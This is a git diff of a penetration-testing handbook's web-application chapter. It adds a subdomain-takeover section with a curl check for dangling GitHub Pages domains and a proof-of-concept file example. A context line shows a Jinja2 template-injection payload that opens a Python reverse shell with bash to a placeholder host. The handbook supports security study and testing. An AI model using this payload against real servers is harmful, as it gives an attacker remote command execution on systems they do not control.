@@ -46,6 +46,7 @@
 - [Remote File Inclusion (RFI)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Remote-File-Inclusion-RFI)
 - [Server-Side Request Forgery (SSRF)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Server-Side-Request-Forgery-SSRF)
 - [Server-Side Template Injection (SSTI)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Server-Side-Template-Injection-SSTI)
+- [Subdomain Takeover](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Subdomain-Takeover)
 - [unfurl](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#unfurl)
 - [Upload Vulnerabilities](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Upload-Vulnerabilities)
 - [waybackurls](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#waybackurls)
@@ -3014,6 +3015,36 @@ ${{<%[%'"}}%\.
 
 ```c
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+```
+
+## Subdomain Takeover
+
+> https://www.youtube.com/watch?v=w4JdIgRGVrE
+
+> https://github.com/EdOverflow/can-i-take-over-xyz
+
+### Check manually for vulnerable Subdomains
+
+```c
+$ curl https://<DOMAIN> | egrep -i "404|GitHub Page"
+```
+
+### Responsible Vulnerability Handling
+
+#### Example
+
+##### GitHub Pages
+
+###### CNAME
+
+```c
+<SUBDOMAIN>.<DOMAIN>
+```
+
+###### 2fchn734865gh234356h668j4dsrtbse9056gh405.html
+
+```c
+<!-- PoC by Red Team -->
 ```
 
 ## unfurl
